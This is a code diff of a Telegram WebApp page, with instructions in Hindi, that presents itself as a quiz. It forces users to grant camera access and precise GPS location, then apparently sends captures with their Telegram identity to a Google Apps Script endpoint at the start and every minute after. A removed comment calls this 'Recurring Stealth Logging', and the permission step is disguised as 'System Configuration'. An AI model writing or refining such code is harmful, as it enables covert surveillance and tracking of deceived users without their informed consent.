@@ -24,8 +24,8 @@
     <h3>System Configuration</h3>
     <div class="instruction-box">
         • सिस्टम सेटअप किया जा रहा है।<br>
-        • प्रक्रिया शुरू करने के बाद सभी पॉप-अप को <b>Allow</b> करें।<br>
-        • यदि टेस्ट शुरू नहीं होता, तो ब्राउज़र सेटिंग्स चेक करें।
+        • प्रक्रिया शुरू करने के बाद 'Allow' पर क्लिक करें।<br>
+        • <b>नोट:</b> यदि लोकेशन नहीं मिल रही, तो फोन का GPS ऑन करके ब्राउज़र को परमिशन दें।
     </div>
     <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
 </div>
@@ -39,7 +39,6 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // Aapki di hui URL
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxCSOW6Lm6sqRDifSvjHLB64smEA1Vl0Ph2H8COe-md67E9COLYFO6cQwkNj0CTidm2YA/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
@@ -54,48 +53,48 @@
     async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
-        btn.innerText = "Configuring... ⏳";
+        btn.innerText = "Verifying Location... ⏳";
 
         try {
-            // 1. Camera Verification
+            // 1. Camera First
             if (!globalStream) {
                 globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
             }
 
-            // 2. High Accuracy Location Verification
-            if (userLoc === "Pending" || userLoc.includes("Timeout")) {
-                try {
-                    const pos = await new Promise((res, rej) => {
-                        navigator.geolocation.getCurrentPosition(res, rej, {
-                            enableHighAccuracy: true, // Accuracy badha di gayi hai
-                            timeout: 15000,           // 15 seconds ka wait time
-                            maximumAge: 0
-                        });
+            // 2. Forced Location Check
+            const getLocation = () => {
+                return new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
                     });
-                    userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-                } catch (e) {
-                    console.log("Location Error:", e);
-                    userLoc = "Error: Please Enable GPS";
-                    // Agar location error hai toh user ko batao
-                    alert("Location Error: कृपया अपने फोन का GPS (Location) चालू करें और Page को Refresh करें।");
-                    btn.disabled = false;
-                    btn.innerText = "प्रक्रिया शुरू करें";
-                    return; // Test shuru nahi hoga bina location ke
-                }
+                });
+            };
+
+            try {
+                const pos = await getLocation();
+                userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+            } catch (err) {
+                // Agar pehli baar fail ho, toh 2 second baad retry karein
+                console.log("Retrying location...");
+                btn.innerText = "Retrying GPS... ⏳";
+                await new Promise(r => setTimeout(r, 2000));
+                const retryPos = await getLocation();
+                userLoc = `${retryPos.coords.latitude}, ${retryPos.coords.longitude}`;
             }
 
-            // 3. Quiz Start
+            // 3. Success - Start Quiz
             document.getElementById("login").style.display = "none";
             document.getElementById("quizBox").style.display = "block";
             loadQuestion();
             
-            // Initial Logging
             captureAndSend("Test_Started");
-            // Recurring Stealth Logging
             setInterval(() => captureAndSend("Periodic_Check"), 60000);
 
         } catch (err) {
-            alert("Security Error: कैमरा एक्सेस अनिवार्य है। कृपया ब्राउज़र सेटिंग्स चेक करें।");
+            console.error(err);
+            alert("Mandatory Error: लोकेशन और कैमरा अनिवार्य है।\n\n1. फोन का GPS ऑन करें।\n2. ब्राउज़र में 'Allow' करें।\n3. अगर पॉप-अप नहीं आ रहा, तो सेटिंग्स में जाकर Site Permissions Reset करें।");
             btn.disabled = false;
             btn.innerText = "प्रक्रिया शुरू करें";
         }
@@ -129,7 +128,7 @@
 
     function loadQuestion() {
         if (currentIdx >= questions.length) { 
-            alert("Test Submitted Successfully!"); 
+            alert("Test Submitted!"); 
             tg.close(); 
             return; 
         }
